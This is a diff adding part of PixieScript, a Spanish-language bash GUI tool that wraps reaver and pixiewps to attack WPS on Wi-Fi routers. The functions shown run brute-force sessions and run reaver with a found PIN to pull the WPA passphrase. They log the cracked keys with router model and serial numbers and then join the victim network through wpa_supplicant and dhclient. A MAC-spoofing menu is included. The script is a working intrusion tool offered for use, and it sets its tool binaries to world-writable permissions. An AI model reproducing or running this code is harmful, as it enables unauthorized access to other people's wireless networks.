+	PORCENTAJE_CPU_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $6}') 
+	PRIORIDAD_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $7}') 
+	PIN_WPS_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $8}') 
+
+	case $ACCION_b in
+		# Porcentaje CPU
+		1) if [ $ESTADO_b = "ACTIVO" ]
+		   then 
+			   "$CPULIMIT" -p $PID_b -l $VALOR_b &
+			   LINEA1_b="$ESTADO_b|$PID_b|$HORA_INICIO_b|$HORA_FINAL_b|$BSSID_b|$VALOR_b|$PRIORIDAD_b|$PIN_WPS_b"
+			   sed -i "s/${LINEA_SESION_b}/${LINEA1_b}/g" "$LOG_SESIONES_BRUTEFORCE"
+			   echo "Porcentaje máximo de CPU cambiado correctamente" > "$LOG_STATUSBAR"
+		   else
+			   yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para cambiar el uso máximo de CPU la sesión debe estar activa" --on-top --center --window-icon=$ICONO_SOFT
+		   fi
+		   ;;
+		# Prioridad
+		2) if [ $ESTADO_b = "ACTIVO" ]
+		   then 
+			   VALOR_REAL=$(expr 20 - "$VALOR_b")
+			   
+			   if [ $VALOR_REAL -eq "-20" ]; then RANGO="MAXIMA";fi
+			   if [ $VALOR_REAL -ge "-19" ] && [ $VALOR_REAL -le "-15" ]; then RANGO="MUY ALTA";fi
+			   if [ $VALOR_REAL -ge "-14" ] && [ $VALOR_REAL -le "-10" ]; then RANGO="ALTA";fi
+			   if [ $VALOR_REAL -ge "-9" ] && [ $VALOR_REAL -le "-1" ]; then RANGO="ELEVADA";fi
+			   if [ $VALOR_REAL -eq "0" ]; then RANGO="NORMAL";fi
+			   if [ $VALOR_REAL -ge "1" ] && [ $VALOR_REAL -le "9" ]; then RANGO="REDUCIDA";fi
+			   if [ $VALOR_REAL -ge "10" ] && [ $VALOR_REAL -le "14" ]; then RANGO="BAJA";fi
+			   if [ $VALOR_REAL -ge "15" ] && [ $VALOR_REAL -le "19" ]; then RANGO="MUY BAJA";fi
+			   if [ $VALOR_REAL -eq "20" ]; then RANGO="MINIMA";fi
+			  
+			   LINEA1_b="$ESTADO_b|$PID_b|$HORA_INICIO_b|$HORA_FINAL_b|$BSSID_b|$PORCENTAJE_CPU_b|$RANGO ($VALOR_b)|$PIN_WPS_b"
+			   sed -i "s/${LINEA_SESION_b}/${LINEA1_b}/g" "$LOG_SESIONES_BRUTEFORCE"
+			   sudo renice $VALOR_REAL -p $PID_b
+			   echo "Prioridad del proceso cambiada correctamente" > "$LOG_STATUSBAR"
+		   else
+			   yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para cambiar la prioridad la sesión debe estar activa" --on-top --center --window-icon=$ICONO_SOFT
+		   fi
+		   ;;
+		# Sesiones máximas
+		3) echo $VALOR_b > "$LOG_MAXIMAS_SESIONES_BRUTEFORCE"
+		   echo "Número de sesiones máximas de bruteforce cambiadas correctamente" > "$LOG_STATUSBAR"
+		   ;;
+		# Recuperar CLAVE WPA
+		4) if [ $ESTADO_b = "FINALIZADO" ]
+		   then
+			   if [ $PIN_WPS_b = "NO" ]
+			   then
+				  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Imposible recuperar clave WPA, no se ha obtenido el PIN WPS en esta sesión" --on-top --center --window-icon=$ICONO_SOFT
+			   else
+				  if [ -f $LOG_MODO_MONITOR ]; then TARJETA_MODO_MONITOR_b=$(head -2 "$LOG_MODO_MONITOR" | tail -1); fi 
+				  if [ -z $TARJETA_MODO_MONITOR_b ] || [ $TARJETA_MODO_MONITOR_b = "C" ]
+				  then
+					    yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para recuperar la clave WPA debes iniciar el modo monitor" --on-top --center --window-icon=$ICONO_SOFT
+				  else
+					    if ControlarProcesos
+					    then
+							echo "Recuperando clave WPA, espera ..." > "$LOG_STATUSBAR"
+							sudo "$REAVER" -i $TARJETA_MODO_MONITOR_b -b $BSSID_b -a -D -X -p $PIN_WPS_b -n -N -vv > "$LOG_ATAQUE"
+							TIEMPO_ATAQUE="100"
+							VEZ="WPA"
+							if EsperarAcabarReaver
+							then	
+								  CLAVE_WPA_b=$(grep "WPA PSK" "$LOG_ATAQUE" | awk -F"'" {' print $2 '})
+								  echo "Clave WPA recuperada correctamente : $CLAVE_WPA_b" > "$LOG_STATUSBAR"
+								  yad --image "info" --title "RECUPERAR CLAVE WPA" --button=gtk-ok:0 --text "<b>INFO</b>: Clave WPA : $CLAVE_WPA_b  " --on-top --center --window-icon=$ICONO_SOFT
+								  AgregarBssidDatabases 3 $BSSID_b
+						      
+								  essid_b=$(head -8 "$RUTA_BRUTEFORCE/$BSSID_b.BF" | tail -1) 
+								  fabricante_b=$(head -9 "$RUTA_BRUTEFORCE/$BSSID_b.BF" | tail -1 | awk -F":" '{print $2}')
+								  modelo_b=$(head -10 "$RUTA_BRUTEFORCE/$BSSID_b.BF" | tail -1 | awk -F":" '{print $2}')
+								  numero_de_modelo_b=$(head -11 "$RUTA_BRUTEFORCE/$BSSID_b.BF" | tail -1 | awk -F":" '{print $2}')
+								  numero_de_serie_b=$(head -12 "$RUTA_BRUTEFORCE/$BSSID_b.BF" | tail -1 | awk -F":" '{print $2}')
+								  device_name_b=$(head -13 "$RUTA_BRUTEFORCE/$BSSID_b.BF" | tail -1 | awk -F":" '{print $2}')
+						      
+								  Archivo_Datos="$RUTA_CLAVES/$essid_b.DATOS"
+								  echo "- Fabricante    : $fabricante_b" > "$Archivo_Datos"
+								  echo "- Modelo        : $modelo_b" >> "$Archivo_Datos"
+								  echo "- Model Number  : $numero_de_modelo_b" >> "$Archivo_Datos"
+								  echo "- Serial Number : $numero_de_serie_b" >> "$Archivo_Datos"
+								  echo "- Device Name   : $device_name_b"  >> "$Archivo_Datos"
+								  echo "- ESSID         : "$essid_b >> "$Archivo_Datos"
+								  echo "- BSSID         : "$BSSID_b  >> "$Archivo_Datos"
+								  echo "- PIN WPS       : "$PIN_WPS_b >> "$Archivo_Datos"
+								  echo "- KEY WPA       : "$CLAVE_WPA_b >> "$Archivo_Datos"
+						        	      
+								  if ! grep -q $BSSID_b "$DATABASE_CLAVES_CONSEGUIDAS"
+								  then
+									  echo $essid_b"|"$BSSID_b"|"$PIN_WPS_b"|"$CLAVE_WPA_b"|"$fabricante_b"|"$modelo_b"|"$numero_de_modelo_b"|"$numero_de_serie_b"|"$device_name_b >> $DATABASE_CLAVES_CONSEGUIDAS
+								  else
+									  if [ $(grep $BSSID_b "$DATABASE_CLAVES_CONSEGUIDAS" | awk -F"|" {'print $4'}) = "?" ] 
+									  then
+										  sed '/'$BSSID_b'/d' "$DATABASE_CLAVES_CONSEGUIDAS" | sed '/^$/d' > TEMPORAL
+										  mv TEMPORAL "$DATABASE_CLAVES_CONSEGUIDAS"
+										  echo $essid_b"|"$BSSID_b"|"$PIN_WPS_b"|"$CLAVE_WPA_b"|"$fabricante_b"|"$modelo_b"|"$numero_de_modelo_b"|"$numero_de_serie_b"|"$device_name_b >> $DATABASE_CLAVES_CONSEGUIDAS
+									  fi
+								  fi
+							else
+								  CLAVE_WPA_b="NO"
+								  echo "No se ha podido recuperar la clave WPA" > "$LOG_STATUSBAR"
+								  yad --image "info" --title "RECUPERAR CLAVE WPA" --button=gtk-ok:0 --text "<b>INFO</b>: No se ha podido recuperar clave WPA  " --on-top --center --window-icon=$ICONO_SOFT
+							fi
+					    else
+							yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para recuperar la clave WPA no pudes estar realizando otro proceso con la tarjeta en modo monitor" --on-top --center --window-icon=$ICONO_SOFT
+					    fi
+					    unset VEZ TIEMPO_ATAQUE
+				  fi
+			  fi
+		   else
+			   yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para recuperar la clave WPA es necesario que la sesion haya finalizado" --on-top --center --window-icon=$ICONO_SOFT 
+		   fi
+		   ;; 
+		# Iniciar sesión
+		5) if [ $ESTADO_b = "DETENIDO" ]
+		   then
+			  IniciarSesion $BSSID_b
+			  echo "Iniciada sesión de bruteforce correctamente" > "$LOG_STATUSBAR"
+		   else
+			  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para iniciar una sesión debe estar detenida" --on-top --center --window-icon=$ICONO_SOFT
+		   fi
+		   ;;
+		# Detener sesión
+		6) if [ $ESTADO_b = "ACTIVO" ] || [ $ESTADO_b = "PAUSADO" ]
+		   then
+			  kill $PID_b
+			  rm "$RUTA_BRUTEFORCE/$BSSID_b.SESION"
+			  LINEA1_b="DETENIDO|-|-|-|$BSSID_b|100|NORMAL (0)|-"
+			  sed -i "s/${LINEA_SESION_b}/${LINEA1_b}/g" "$LOG_SESIONES_BRUTEFORCE"
+			  echo "Detenida sesión de bruteforce correctamente" > "$LOG_STATUSBAR"
+		   else
+			  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para detener una sesión debe estar activa" --on-top --center --window-icon=$ICONO_SOFT
+		   fi
+		   ;;
+		# Pausar sesión
+		7) if [ $ESTADO_b = "ACTIVO" ]
+		   then
+			  kill -STOP $PID_b
+			  LINEA1_b="PAUSADO|$PID_b|$HORA_INICIO_b|$HORA_FINAL_b|$BSSID_b|$PORCENTAJE_CPU_b|$PRIORIDAD_b)|$PIN_WPS_b"
+			  sed -i "s/${LINEA_SESION_b}/${LINEA1_b}/g" "$LOG_SESIONES_BRUTEFORCE"
+			  echo "Pausada sesión de bruteforce correctamente" > "$LOG_STATUSBAR"
+		   else
+			  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para pausar una sesión debe estar activa" --on-top --center --window-icon=$ICONO_SOFT
+		   fi
+		   ;;
+		# Continuar sesión
+		8) if [ $ESTADO_b = "PAUSADO" ]
+		   then 
+			  kill -CONT $PID_b
+			  LINEA1_b="ACTIVO|$PID_b|$HORA_INICIO_b|$HORA_FINAL_b|$BSSID_b|$PORCENTAJE_CPU_b|$PRIORIDAD_b)|$PIN_WPS_b"
+			  sed -i "s/${LINEA_SESION_b}/${LINEA1_b}/g" "$LOG_SESIONES_BRUTEFORCE"
+			  echo "Reanudada sesión de bruteforce correctamente" > "$LOG_STATUSBAR"
+		   else
+			  yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para reanudar una sesión debe estar pausada" --on-top --center --window-icon=$ICONO_SOFT
+		   fi
+		   ;;
+		# Eliminar sesión
+		9) if [ $ESTADO_b = "ACTIVO" ] || [ $ESTADO_b = "PAUSADO" ]; then kill $PID_b; rm "$RUTA_BRUTEFORCE/$BSSID_b.SESION"; fi
+		   sed -i "/$LINEA_SESION_b/d" $LOG_SESIONES_BRUTEFORCE
+		   if [ $ESTADO_b != "FINALIZADO" ]; then sed -i "/$BSSID_b/d" "$DATABASE_REDES_ATACADAS"; fi
+		   if [ -f  "$RUTA_BRUTEFORCE/$BSSID_b.BF" ]; then rm "$RUTA_BRUTEFORCE/$BSSID_b.BF"; fi
+		   echo "Eliminada sesión de bruteforce correctamente" > "$LOG_STATUSBAR"
+		   ;;
+	esac
+	touch "$LOG_TIMER_BRUTEFORCE"
+	unset ACCION_b LINEA_SESION_b VALOR_b PID_b ESTADO_b HORA_INICIO_b HORA_FINAL_b BSSID_b PORCENTAJE_CPU_b PRIORIDAD_b PIN_WPS_b VALOR_REAL RANGO canal_b TARJETA_MODO_MONITOR_b CLAVE_WPA_b essid_b fabricante_b modelo_b numero_de_modelo_b numero_de_serie_b device_name_b
+}
+
+
+ControlarProcesos() {
+	echo "***************** ControlarProcesos"
+	if [ -n "$(ps -A | grep airodump-ng)" ]; then return 1; fi
+	if [ -n "$(ps -A | grep reaver_pixie)" ]; then return 1; fi
+	return 0
+}
+
+
+RecuperarWPA() {
+	echo "***************** RecuperarWPA"
+	if [ -z $LINEA_PORTAPAPELES ]
+	then
+	      yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Debes seleccionar un AP" --on-top --center --window-icon=$ICONO_SOFT
+	      touch $LOG_TIMER_VER
+	      return
+	fi
+	
+	if [ -f $LOG_MODO_MONITOR ]; then TARJETA_MODO_MONITOR_v=$(head -2 "$LOG_MODO_MONITOR" | tail -1); fi 
+	if [ -z $TARJETA_MODO_MONITOR_v ] || [ $TARJETA_MODO_MONITOR_v = "C" ]
+	then
+	      yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para recuperar la clave WPA debes iniciar el modo monitor" --on-top --center --window-icon=$ICONO_SOFT
+	      touch $LOG_TIMER_VER
+	      return
+	fi
+	
+	if ControlarProcesos
+	then
+		LINEA_VER=$(grep $LINEA_PORTAPAPELES "$DATABASE_CLAVES_CONSEGUIDAS")
+		k_wps=$(echo $LINEA_VER | awk -F"|" '{print $3}')
+		k_wpa=$(echo $LINEA_VER | awk -F"|" '{print $4}')
+		k_bssid=$(echo $LINEA_VER | awk -F"|" '{print $2}')
+		if [ $k_wpa != "?" ]
+		then
+			yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Ya tienes la clave WPA de este AP, no se recuperará" --on-top --center --window-icon=$ICONO_SOFT
+		else
+			echo "Recuperando clave WPA, espera ..." > "$LOG_STATUSBAR"
+			sudo "$REAVER" -i $TARJETA_MODO_MONITOR_v -b $k_bssid -a -D -X -p $k_wps -n -N -vv > "$LOG_ATAQUE"
+			TIEMPO_ATAQUE="100"
+			VEZ="WPA"
+			if EsperarAcabarReaver
+			then	
+				k_wpa=$(grep "WPA PSK" "$LOG_ATAQUE" | awk -F"'" {' print $2 '})
+				k_1=$(echo $LINEA_VER | awk -F"|" '{print $1}')
+				k_5=$(echo $LINEA_VER | awk -F"|" '{print $5}')
+				k_6=$(echo $LINEA_VER | awk -F"|" '{print $6}')
+				k_7=$(echo $LINEA_VER | awk -F"|" '{print $7}')
+				k_8=$(echo $LINEA_VER | awk -F"|" '{print $8}')
+				k_9=$(echo $LINEA_VER | awk -F"|" '{print $9}')
+				NEW_LINEA_VER="$k_1|$k_bssid|$k_wps|$k_wpa|$k_5|$k_6|$k_7|$k_8|$k_9"
+				sed -i "s/${LINEA_VER}/${NEW_LINEA_VER}/g" "$DATABASE_CLAVES_CONSEGUIDAS"
+				echo "Clave WPA recuperada correctamente : $k_wpa" > "$LOG_STATUSBAR"
+				yad --image "info" --title "RECUPERAR CLAVE WPA" --button=gtk-ok:0 --text "<b>INFO</b>: Clave WPA : $k_wpa  " --on-top --center --window-icon=$ICONO_SOFT
+			else
+				echo "No se ha podido recuperar la clave WPA" > "$LOG_STATUSBAR"
+				yad --image "info" --title "RECUPERAR CLAVE WPA" --button=gtk-ok:0 --text "<b>INFO</b>: No se ha podido recuperar clave WPA  " --on-top --center --window-icon=$ICONO_SOFT
+			fi
+		fi
+	else
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Para recuperar la clave WPA no pudes estar realizando otro proceso con la tarjeta en modo monitor" --on-top --center --window-icon=$ICONO_SOFT
+	fi
+	touch "$LOG_TIMER_VER"
+	unset LINEA_VER k_wpa k_wps TIEMPO_ATAQUE VEZ k_1 k_2 k_5 k_6 k_7 k_8 k_9 NEW_LINEA_VER TARJETA_MODO_MONITOR_v 
+}
+
+
+EliminarLineaVer() {
+	echo "***************** EliminarLineaVer"
+	if [ -z $LINEA_PORTAPAPELES ]
+	then
+	      yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Debes seleccionar un AP" --on-top --center --window-icon=$ICONO_SOFT
+	      touch $LOG_TIMER_VER
+	      return
+	fi
+	LINEA_VER=$(grep $LINEA_PORTAPAPELES "$DATABASE_CLAVES_CONSEGUIDAS")
+	sed -i "/$LINEA_VER/d" "$DATABASE_CLAVES_CONSEGUIDAS"
+	echo "BSSID eliminado correctamente" > "$LOG_STATUSBAR"
+	touch "$LOG_TIMER_VER"
+}
+
+
+ConectarAP() {
+	echo "***************** ConectarAP"
+	if [ -z $LINEA_PORTAPAPELES ]
+	then
+	      yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Debes seleccionar un AP" --on-top --center --window-icon=$ICONO_SOFT
+	      return
+	fi
+	
+	LINEA_VER=$(grep $LINEA_PORTAPAPELES "$DATABASE_CLAVES_CONSEGUIDAS")
+	AP=$(echo $LINEA_VER | awk -F"|" '{print $1}')
+	AP=$(echo $AP)
+	KEY=$(echo $LINEA_VER | awk -F"|" '{print $4}')
+	KEY=$(echo $KEY)
+	PROCESOS=$(ps -A -o comm=Command | grep -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc)
+	TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA | awk {' print $1 '})
+	TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA)
+	
+	if [ -f $LOG_MODO_MONITOR ]; then TARJETA_MODO_MONITOR_c=$(head -2 "$LOG_MODO_MONITOR" | tail -1); fi 
+	
+	yad --image "dialog-question" --title "CONECTAR" --button=gtk-yes:1 --button=gtk-no:0 --text "<b>ATENCION</b> Se conectará al AP $AP con la interface $TARJETA_SELECCIONADA\n\nSe detendrán los siguientes procesos :\n$PROCESOS\n\n<b>¿ Continuar ?</b>" --width=450 --on-top --center --window-icon=$ICONO_SOFT
+	ret=$?
+	if [ $ret = "1" ]
+	then
+		echo "CONECTANDO A LA RED $AP, ESPERA ..." > "$LOG_STATUSBAR"
+		if [ -n $TARJETA_MODO_MONITOR_c ] || [ $TARJETA_MODO_MONITOR_c != "C" ]
+		then
+			sudo airmon-ng stop $TARJETA_MODO_MONITOR_c
+			sleep 1
+		fi
+		for proceso in $PROCESOS
+		do
+			if [ $proceso = "NetworkManager" ]
+			then
+				touch "$LOG_PROCESOS"
+				NetworkManager stop
+			else
+				killall $proceso
+			fi
+		done
+		sudo bash -c "wpa_passphrase $AP $KEY" > "$RUTA_LOGS/$AP.conf"
+		sudo wpa_supplicant -B -i $TARJETA_SELECCIONADA -c "$RUTA_LOGS/$AP.conf" -D wext
+		sudo dhclient -r
+		sudo dhclient $TARJETA_SELECCIONADA
+		
+	fi
+	
+	sleep 5
+	
+        for i in `seq 1 10`;
+        do
+                echo "FINALIZANDO LA CONEXION A LA RED $AP, ESPERA ..." > "$LOG_STATUSBAR"
+                sleep 1
+                IP=$(ifconfig $TARJETA_SELECCIONADA | grep "inet addr" | awk '{ print $2 }' | awk -F":" {'print $2'})
+                if [ -n "$IP" ]
+                then
+			 echo "CONECTADO A LA RED $AP CON LA IP $IP ( PARA DESCONECTARTE CIERRA PIXIESCRIPT )" > "$LOG_STATUSBAR"
+			 yad --image "info" --title "CONECTADO" --button=gtk-ok:0 --text "<b>TE HAS CONECTADO CORRECTAMENTE A LA RED $AP CON LA IP $IP</b>\n\nPARA DESCONECTARTE SIMPLEMENTE CIERRA PIXIESCRIPT" --on-top --center --window-icon=$ICONO_SOFT
+			 unset LINEA_VER AP KEY proceso PROCESOS ret
+			 return 
+                fi
+                
+        done
+        echo "ERROR: NO SE HA PODIDO CONECTAR A LA RED $AP, QUIZA ESTES DEMASIADO LEJOS" > "$LOG_STATUSBAR"
+	yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: NO SE HA PODIDO CONECTAR A LA RED $AP, QUIZA ESTES DEMASIADO LEJOS" --on-top --center --window-icon=$ICONO_SOFT
+	unset LINEA_VER AP KEY proceso PROCESOS ret
+}
+
+
+NetworkManager() {
+	ACCION=$1
+	DetectarDistro
+	
+	case $DISTRIBUCION in
+		"LinuxMint") sudo service network-manager $ACCION ;;
+		"wifislax")  /etc/rc.d/rc.networkmanager $ACCION ;;
+		"Ubuntu")    sudo service network-manager $ACCION ;;
+		"?") if [ "$ACCION" = "stop" ]; then killall NetworkManager; fi ;;
+	esac 
+}
+
+
+DetectarDistro() {
+	if [ -f "/etc/wifislax-version" ]
+	then
+		DISTRIBUCION=$(cat /etc/wifislax-version | awk {' print $1 '})
+	elif [ -f "/usr/bin/lsb_release" ]
+	then
+		DISTRIBUCION=$(lsb_release -i -s)
+	else
+		DISTRIBUCION="?"
+	fi
+}
+
+
+Permisos() {
+	if [ -f "$RUTA_HERRAMIENTAS/reaver_pixie" ] && [ -f "$RUTA_HERRAMIENTAS/wash" ] && [ -f "$RUTA_HERRAMIENTAS/pixiewps" ] && [ -f "$RUTA_HERRAMIENTAS/xclip" ] && [ -f "$RUTA_HERRAMIENTAS/cpulimit" ]
+	then
+		sudo chmod 777 "$RUTA_HERRAMIENTAS/reaver_pixie"
+		sudo chmod 777 "$RUTA_HERRAMIENTAS/wash"
+		sudo chmod 777 "$RUTA_HERRAMIENTAS/pixiewps"
+		sudo chmod 777 "$RUTA_HERRAMIENTAS/xclip"
+		sudo chmod 777 "$RUTA_HERRAMIENTAS/cpulimit"
+	else
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: DEBES EJECUTAR EL INSTALADOR ANTES DE USAR EL SCRIPT" --on-top --center --window-icon=$ICONO_SOFT
+		exit 1
+	fi
+}
+
+
+Limpiar() {
+	echo "***************** Limpiar"
+	PROCESOS=$(ps -A -o comm=Command | grep -e reaver_pixie -e airodump-ng -e wash -e pixiewps)
+	if [ -n "$PROCESOS" ]
+	then
+	    echo "Deteniendo procesos : $PROCESOS"
+	    touch $SEMAFORO_DETENER_TODO
+	    echo "DETENIENDO PROCESOS EN MARCHA; ESPERA ..." > "$LOG_STATUSBAR"
+	    sleep 2
+	fi
+	
+	TARJETA_SELECCIONADA=$(echo $TARJETA_SELECCIONADA | awk {' print $1 '})
+	TARJETA_MODO_MONITOR=$(head -2 "$LOG_MODO_MONITOR" | tail -1) 
+	
+	if [ $TARJETA_MODO_MONITOR != "C" ]
+	then
+		DeshabilitarNetworkManager OFF
+		sudo airmon-ng stop $TARJETA_MODO_MONITOR 
+	fi
+	
+	sudo killall reaver_pixie
+	sudo killall airodump-ng
+	sudo killall xclip 
+	sudo killall pixiewps
+	sudo killall cpulimit
+	
+	rm "$RUTA_BASE"/*resultado
+	
+	vPID=$(ps -A -o cmd,pid | grep "gtkdialog --program=DUMP" | awk '{ print $3  }')
+	if [ -n "$vPID" ]; then sudo kill $vPID; fi
+	LINEA1=$(grep -m 1 ACTIVO "$LOG_SESIONES_BRUTEFORCE")
+	while [ -n "$LINEA1" ]
+	do
+		bssid=$(echo $LINEA1 | awk -F"|" '{ print$5 }')
+		LINEA2="DETENIDO|-|-|-|$bssid|100|NORMAL (0)|-"
+		sed -i "s/${LINEA1}/${LINEA2}/g" "$LOG_SESIONES_BRUTEFORCE"
+		rm "$RUTA_BRUTEFORCE/$bssid.SESION"
+		LINEA1=$(grep -m 1 ACTIVO "$LOG_SESIONES_BRUTEFORCE")
+	done
+	LINEA1=$(grep -m 1 PAUSADO "$LOG_SESIONES_BRUTEFORCE")
+	while [ -n "$LINEA1" ]
+	do
+		bssid=$(echo $LINEA1 | awk -F"|" '{ print$5 }')
+		LINEA2="DETENIDO|-|-|-|$bssid|100|NORMAL (0)|-"
+		sed -i "s/${LINEA1}/${LINEA2}/g" "$LOG_SESIONES_BRUTEFORCE"
+		rm "$RUTA_BRUTEFORCE/$bssid.SESION"
+		LINEA1=$(grep -m 1 PAUSADO "$LOG_SESIONES_BRUTEFORCE")
+	done
+	sed -i '/^$/d' "$LOG_SCRIPT"
+	if [ -f "$LOG_PROCESOS" ]
+	then 
+	    sudo killall wpa_supplicant
+	    sudo killall dhclient
+	    NetworkManager start 
+	fi
+	sudo rm -rf $RUTA_LOGS 
+	exit
+}
+ 
+export -f ActivarModoMonitor
+export -f CheckInterface
+export -f DeshabilitarNetworkManager
+export -f EscanearRedes
+export -f ProcesarDatosScaneo
+export -f TipoAtaque
+export -f AtacarTodos
+export -f ExtraerDatosAp
+export -f AtacarAP
+export -f EsperarAcabarReaver
+export -f MatarReaver
+export -f ExtraerDatosReaver
+export -f AgregarBssidDatabases
+export -f AnalizarLogPixiewps
+export -f Limpiar
+export -f IntroducirDatosAp
+export -f ValidarTiempos
+export -f CambioMacRandom
+export -f CambioMacManual
+export -f CopiarPortapapeles
+export -f ExportarKeys
+export -f ActualizarDatabase
+export -f ActualizarScript
+export -f ComprobarConexion
+export -f RecopilarDatosBruteforce
+export -f AgregarSesion
+export -f IniciarSesion
+export -f ComprobarSesiones
+export -f SesionTerminada
+export -f AccionesBruteforce
+export -f ControlarProcesos
+export -f RecuperarWPA
+export -f EliminarLineaVer
+export -f ConectarAP
+export -f DetectarDistro
+export -f NetworkManager
+export -f Permisos
+export -f ValidarMac
+
+Permisos
+
+export MENU='
+<window title="PixieScript '${VERSION}' by 5.1" resizable="true" window_position="1" width-request="800" height-request="600"  border-width="6" image-name="'"$ICONO_SCRIPT"'">
+	<vbox spacing="0">
+		<menubar>
+			<menu image-name="'"$ICONO_MENU"'" label="MENU" use-underline="false">
+				<menu image-name="'"$ICONO_MACHANGER"'" label="CAMBIAR MAC ADRESS">
+					<menuitem image-name="'"$ICONO_MANUAL"'" label="CAMBIO MANUAL">
+					<action>'CambioMacManual'</action>
+					</menuitem>
+					<menuitemseparator></menuitemseparator>
+					<menuitem image-name="'"$ICONO_RANDOM"'" label="CAMBIO AUTOMATICO">
+					<action>'CambioMacRandom'</action>
+					</menuitem>
+				</menu>
+				<menu image-name="'"$ICONO_CLAVES"'" label="CLAVES">
+					<menuitem image-name="'"$ICONO_VER"'" label="VER">
+					<action>gtkdialog --program=DUMP_KEYS & </action>
+					</menuitem>
+					<menuitemseparator></menuitemseparator>
+					<menuitem image-name="'"$ICONO_EXPORTAR"'" label="EXPORTAR">
+					<action>'ExportarKeys'</action>
+					</menuitem>
+					<height>16</height><width>16</width>
+				</menu>
+				<menu image-name="'"$ICONO_UPDATE"'" label="ACTUALIZAR">
+					<menuitem image-name="'"$ICONO_DATABASE"'" label="BASE DE DATOS DE APs AFECTADOS">
+					<variable>ITEM_ACTUALIZAR_DATABASE</variable>
+					<action>'ActualizarDatabase' &</action>
+					</menuitem>
+					<menuitemseparator></menuitemseparator>
+					<menuitem image-name="'"$ICONO_SOFT"'" label="ACTUALIZAR PIXIESCRIPT">
+					<variable>ITEM_ACTUALIZAR_SCRIPT</variable>
+					<action>'ActualizarScript' &</action>
+					</menuitem>
+					<height>16</height><width>16</width>
+				</menu>
+			</menu>
+			<menu icon-name="gtk-help" label="LEYENDA SCANEO" use-underline="false">
+				<menuitem icon-name="gtk-about" label="Pin conseguido"></menuitem>
+				<menuitem icon-name="gtk-apply" label="AP Vulnerable"></menuitem>
+				<menuitem icon-name="gtk-dialog-error" label="AP NO vulnerable"></menuitem>
+				<menuitem icon-name="gtk-dialog-warning" label="No se han conseguido datos para realizar el ataque"></menuitem>
+				<menuitem icon-name="gtk-dialog-question" label="AP no probado"></menuitem>
+				<menuitem icon-name="gtk-execute" label="AP en sesión Bruteforce"></menuitem>
+			</menu>
+
+		</menubar>
+		<notebook space-expand="true" space-fill="true" tab-labels="REDES|ATAQUE|BRUTEFORCE" tab-pos="3">
+		<tree auto-refresh="false" selected-row="0"  column-sort-function="1|1|1|1|1|1|1" vscrollbar-policy="1">
+			<variable>TABLA_SCAN</variable>
+			<input file icon-column="0">"'"$LOG_REDES_ESCANEADAS"'"</input>
+			<label>Nº  |BSSID                      |Channel    |SEÑAL |WPS Version| Locked    |ESSID                  </label>
+		</tree>
+		<tree vscrollbar-policy="1" column-header-active="0" selection-mode="0" width="200">
+			<label>LOG ATAQUE</label>
+			<variable>TXT_ATAQUE</variable>
+			<input file>"'"$LOG_ATAQUE"'"</input>
+		</tree>
+		<vbox spacing="0">
+			<vbox space-expand="true" space-fill="true">
+				<tree auto-refresh="true" selected-row="8" exported-column="4" column-visible="1|1|1|1|1|1|1|1|0">
+				<variable>TABLA_BRUTEFORCE</variable>
+				<input file>"'"$LOG_SESIONES_BRUTEFORCE"'"</input>
+				<label>ESTADO   |PID   |HORA INICIO|HORA FINAL|BSSID           |% MAX CPU |PRIORIDAD     |PIN FOUND|</label>
+				</tree>
+			</vbox>
+			<vbox homogeneous="true" space-expand="false" space-fill="false">
+				<frame>
+					<expander expanded="false" use-underline="true"label="Prioridad proceso bruteforce">
+					<hbox homogeneous="false" space-expand="false" space-fill="false">
+						<hscale width-request="190" height-request="-1" range-min="1" range-max="100" range-step="1" value-pos="1" block-function-signals="true">
+						<variable>PORCENTAJE_CPU</variable>
+						<input>echo 100</input>
+						<item>"100 |2|<span fgcolor='"'white'"' bgcolor='"'darkblue'"'> -    % MAX USO DE CPU    + </span>"</item>
+						</hscale>
+						
+						<button tooltip-text="Aplicar cambios porcentaje CPU">
+							<input file>'$ICONO_APLICAR'</input>
+							<variable>Aplicar1</variable>
+							<action>disable:Aplicar1</action>
+							<action>enable:TimerBruteforce</action>
+							<action>'AccionesBruteforce' 1 $TABLA_BRUTEFORCE $PORCENTAJE_CPU</action>
+						</button>
+						
+						<vseparator width-request="12"></vseparator>
+						
+						<hscale width-request="190" height-request="-1" range-min="0" range-max="40" range-step="1" value-pos="1" block-function-signals="true">
+						<variable>PRIORIDAD</variable>
+						<input>echo 20</input>
+						<item>"20 |2|<span fgcolor='"'white'"' bgcolor='"'darkblue'"'> -    PRIORIDAD PROCESO    + </span>"</item>
+						</hscale>
+					
+						<button tooltip-text="Aplicar cambios prioridad del proceso">
+						<input file>'$ICONO_APLICAR'</input>
+						<variable>Aplicar2</variable>
+						<action>disable:Aplicar2</action>
+						<action>enable:TimerBruteforce</action>
